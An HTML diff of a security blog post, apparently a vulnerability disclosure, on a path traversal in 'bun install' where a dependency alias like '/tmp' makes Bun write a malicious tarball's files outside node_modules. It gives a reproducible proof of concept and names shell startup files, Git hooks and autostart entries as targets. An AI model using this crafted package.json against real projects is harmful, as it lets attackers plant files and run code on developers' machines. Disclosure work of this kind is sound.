@@ -2,31 +2,116 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Arbitrary File Write via Dependency Aliases in bun install | X3r0Day</title>
-    <meta name="description" content="A path traversal issue in Bun dependency aliases allows arbitrary file writes outside the project, even with lifecycle scripts disabled.">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#1c1d20">
+    <title>Bun install: arbitrary file write | X3r0Day</title>
+    <meta name="description" content="A dependency alias takes Bun outside node_modules. Arbitrary file writes, even with lifecycle scripts disabled.">
+    <meta name="author" content="X3r0Day">
+    <meta property="og:title" content="Bun install: arbitrary file write">
+    <meta property="og:description" content="A dependency alias takes Bun outside node_modules. Arbitrary file writes, even with lifecycle scripts disabled.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://x3r0day.me/blog/bun-file-traversal/">
     <link rel="canonical" href="https://x3r0day.me/blog/bun-file-traversal/">
-    <link rel="stylesheet" href="/style.css">
-    <link rel="stylesheet" href="/blog/blog.css">
-    <script defer src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml">
+    <link rel="preload" href="/assets/fonts/fragment-mono-latin.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="/assets/fonts/silkscreen-400-latin.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="stylesheet" href="/style.css?v=b345641a10a2">
+    <link rel="stylesheet" href="/blog/blog.css?v=e6cf661b0258">
+    <script defer src="/script.js?v=31e9c72a52f7"></script>
     <script defer src="/blog/blog.js"></script>
 </head>
-<body class="blog-page">
-    <main class="window outset blog-window">
-        <div class="title-bar">
-            <div class="title-text"><span aria-hidden="true">📝</span> Bun File Traversal.md - Notepad</div>
-        </div>
-        <nav class="menu-bar" aria-label="Site navigation">
-            <a href="/blog/">All posts</a>
-            <a href="/">Home</a>
-        </nav>
-        <article class="inset" id="notepad-content" aria-live="polite" aria-busy="true">
-            <p>Loading post...</p>
-            <noscript><p>Enable JavaScript to view the formatted post, or read the Markdown file below.</p></noscript>
-        </article>
-        <footer class="menu-bar">
-            <a id="post-source" href="/blog/writeups/Bun%20File%20Traversal.md">Read Markdown</a>
-        </footer>
-    </main>
+<body class="reading-page">
+<a class="skip-link" href="#main">Skip to content</a>
+<header class="site-header"><div class="header-inner wrap">
+    <a class="brand" href="/" aria-label="X3r0Day home">X3r0Day<span class="brand-suffix">Research &amp; notes</span></a>
+    <nav class="site-nav" id="site-nav" aria-label="Main navigation">
+        <a href="/">Research</a>
+        <a href="/blog/" aria-current="page">Writeups</a>
+        <a href="/#tools">Projects</a><a href="/#about">About</a>
+    </nav>
+    <div class="header-actions"><button class="search-trigger" type="button" aria-label="Search research" aria-controls="site-search" hidden><svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.4" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6.5"/><path d="m16 16 5 5"/></svg></button><button class="menu-toggle" aria-controls="site-nav" aria-expanded="false" hidden>Menu <span aria-hidden="true">+</span></button></div>
+</div></header>
+<div class="reading-progress" aria-hidden="true"></div>
+<main id="main" class="article-page wrap">
+    <header class="article-header"><a class="back-link" href="/blog/"><span aria-hidden="true">←</span> All writing</a><div class="article-meta"><span class="topic-tag sage">Supply chain</span><span>May 2026</span><span>3 min read</span></div><h1>Bun install: arbitrary file write</h1><p class="article-dek">A dependency alias takes Bun outside node_modules. Arbitrary file writes, even with lifecycle scripts disabled.</p><div class="article-byline"><span class="author-mark" aria-hidden="true">x3</span><span>Words &amp; research by <strong>X3r0Day</strong></span><a class="source-link" href="/blog/writeups/Bun%20File%20Traversal.md">View Markdown ↗</a></div></header>
+    <div class="article-resources"><a href="https://github.com/X3r0Day/BunPoCTest">Proof of concept ↗</a></div>
+    <div class="article-layout"><aside class="article-sidebar"><details class="toc" open><summary>In this article <span aria-hidden="true">⌄</span></summary><nav aria-label="Table of contents"><a href="#summary">Summary</a><a href="#why-it-happens">Why it happens</a><a href="#proof-of-concept">Proof of concept</a><a href="#impact">Impact</a><a href="#attack-complexity">Attack complexity</a><a href="#what-bun-should-ve-done">What bun should&#39;ve done</a></nav></details></aside><article class="prose" id="post-content"><h2 id="summary">Summary</h2>
+<p>I found a path traversal issue in <code>bun install</code>.</p>
+<p>If a project puts an absolute path or <code>../</code> path inside a dependency alias name, Bun uses that alias as part of the install path. Because of that, a package can be installed outside <code>node_modules</code>.</p>
+<p>This works even with scripts disabled:</p>
+<pre><code class="language-sh">bun install --ignore-scripts --linker=hoisted
+</code></pre>
+<p>So this is not a lifecycle script issue. It is a file write issue during package extraction/install.</p>
+<h2 id="why-it-happens">Why it happens</h2>
+<p>The dependency key from <code>package.json</code> is treated as the package alias. Bun later uses that alias as the destination folder name for the installed package.</p>
+<p>The problem is that the alias is not rejected when it is an absolute path like <code>/tmp</code>, or when it contains path traversal like <code>../../</code>.</p>
+<p>So this package.json is accepted by Bun:</p>
+<pre><code class="language-json">{
+  &quot;name&quot;: &quot;victim-project&quot;,
+  &quot;version&quot;: &quot;1.0.0&quot;,
+  &quot;dependencies&quot;: {
+    &quot;/tmp&quot;: &quot;file:./evil.tgz&quot;
+  }
+}
+</code></pre>
+<p>In npm, this kind of package name is rejected as invalid. Bun installs it.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>I created a small setup script that builds a local malicious tarball. The tarball contains this file:</p>
+<pre><code class="language-text">package/pwned
+</code></pre>
+<p>with this content:</p>
+<pre><code class="language-text">pwned
+</code></pre>
+<p>The generated project uses this dependency:</p>
+<pre><code class="language-json">{
+  &quot;dependencies&quot;: {
+    &quot;/tmp&quot;: &quot;file:./evil.tgz&quot;
+  }
+}
+</code></pre>
+<p>Steps to reproduce from an empty folder:</p>
+<pre><code class="language-sh">/path/to/setup.sh
+cd victim-project
+bun install --ignore-scripts --linker=hoisted
+../check-result.sh
+</code></pre>
+<p>Expected result:</p>
+<pre><code class="language-text">/tmp/pwned exists
+Content:
+pwned
+</code></pre>
+<p>Observed Bun output:</p>
+<pre><code class="language-text">bun install v1.3.14
+
++ /tmp@./evil.tgz
+
+1 package installed
+</code></pre>
+<p>After the install finishes, <code>/tmp/pwned</code> exists and contains <code>pwned</code>.</p>
+<p>The important part is that <code>/tmp/pwned</code> is outside the project folder and outside <code>node_modules</code>.</p>
+<h2 id="impact">Impact</h2>
+<p>An attacker can put this in a malicious repository and ask a victim to run a normal Bun install command.</p>
+<p>The victim does not need to run any package scripts. <code>--ignore-scripts</code> does not stop it.</p>
+<p>This gives the attacker the ability to write files anywhere the current user has permission to write. The <code>/tmp/pwned</code> file is only a safe demo target. The same bug can be used against more useful user-writable paths, for example <strong>shell startup</strong> files, Git hooks, <strong>desktop autostart</strong> entries, or user-owned binaries.</p>
+<p>That can turn into code execution when the overwritten file is later used by the system or by the user.</p>
+<p>If Bun is run with higher privileges, the impact becomes higher because the write happens with those privileges.</p>
+<h2 id="attack-complexity">Attack complexity</h2>
+<p>Attack complexity is low.</p>
+<p>The attacker only needs to provide a project with a crafted <code>package.json</code> and tarball. The victim only needs to run:</p>
+<pre><code class="language-sh">bun install
+</code></pre>
+<p>or:</p>
+<pre><code class="language-sh">bun install --ignore-scripts
+</code></pre>
+<p>No network access is required for the local tarball version of the PoC. No race condition is needed. No package lifecycle scripts are needed.</p>
+<h2 id="what-bun-should-ve-done">What bun should&#39;ve done</h2>
+<p>Bun should&#39;ve rejected dependency aliases that are not valid npm package names before using them as install paths.</p>
+<p>At minimum, aliases should be rejected if they are absolute paths, contain <code>..</code> path components, or contain invalid path separators. Scoped names like <code>@scope/name</code> should still be allowed.</p>
+</article></div>
+    <div class="article-end"><span>Thanks for reading.</span><a class="text-link" href="/blog/">Back to all writing <span aria-hidden="true">↗</span></a></div>
+    <a class="next-post blue" href="/blog/fsmonitor-lrce/"><div><span>Keep reading</span><h2>Git FSMonitor: workspace poisoning</h2></div><span aria-hidden="true">↗</span></a>
+</main>
+<footer class="site-footer wrap"><a class="footer-name" href="/">X3r0Day<span> / independent research</span></a><div><a href="https://github.com/X3r0Day">GitHub ↗</a><a href="https://x.com/X3r0DaySec">X / Twitter ↗</a><a href="mailto:cr4n@duck.com">Email ↗</a></div><span>© 2026</span></footer>
+<dialog id="site-search" class="search-dialog" aria-labelledby="search-title"><div class="search-dialog-heading"><h2 id="search-title">Search the index.</h2><button type="button" class="search-close" aria-label="Close search">×</button></div><label class="sr-only" for="site-query">Search research and projects</label><input id="site-query" type="search" placeholder="A finding, a tool, a question…" autocomplete="off" autofocus><p class="search-status" role="status"></p><ul class="search-results"><li data-search="emacs: code execution on file open an ordinary file. an unexpected execution path. how emacs directory locals bypassed the very check meant to keep them safe. editor security"><a href="/blog/emacs-dir-locals-code-execution/"><span>Editor security</span><strong>Emacs: code execution on file open</strong><span aria-hidden="true">↗</span></a></li><li data-search="hermes agent: unauthenticated rce an exposed session token in hermes agent turns a dashboard visit into unauthenticated code execution and credential access. application security"><a href="/blog/hermes-agent-unauth-rce/"><span>Application security</span><strong>Hermes Agent: unauthenticated RCE</strong><span aria-hidden="true">↗</span></a></li><li data-search="bun install: arbitrary file write a dependency alias takes bun outside node_modules. arbitrary file writes, even with lifecycle scripts disabled. supply chain"><a href="/blog/bun-file-traversal/"><span>Supply chain</span><strong>Bun install: arbitrary file write</strong><span aria-hidden="true">↗</span></a></li><li data-search="git fsmonitor: workspace poisoning when git-aware editors trust a poisoned workspace, a routine status check can become local code execution. developer tooling"><a href="/blog/fsmonitor-lrce/"><span>Developer tooling</span><strong>Git FSMonitor: workspace poisoning</strong><span aria-hidden="true">↗</span></a></li><li data-search="insect v2 an earlier red-team project revisiting 1990s malware, preserved from the original research collection. red-team research"><a href="https://github.com/X3r0Day/FUD-C2-Framework.git"><span>Red-team research</span><strong>Insect V2</strong><span aria-hidden="true">↗</span></a></li><li data-search="workspace trust &amp; python .pth files the research collection covering vs code python initialization and git fsmonitor workspace poisoning. developer tooling"><a href="https://github.com/X3r0Day/X3r0Day-Research"><span>Developer tooling</span><strong>Workspace trust &amp; Python .pth files</strong><span aria-hidden="true">↗</span></a></li><li data-search="a data-exposure disclosure to cert-in a coordinated report concerning exposed personal data on an indian government website. responsible disclosure"><a href="https://x.com/X3r0DaySec/status/2063002547561115826"><span>Responsible disclosure</span><strong>A data-exposure disclosure to CERT-In</strong><span aria-hidden="true">↗</span></a></li></ul><p class="search-empty" hidden>No matches. Try a different word.</p><div class="search-dialog-foot"><span>Research, not a search engine.</span><span>Esc to close</span></div></dialog>
 </body>
 </html>
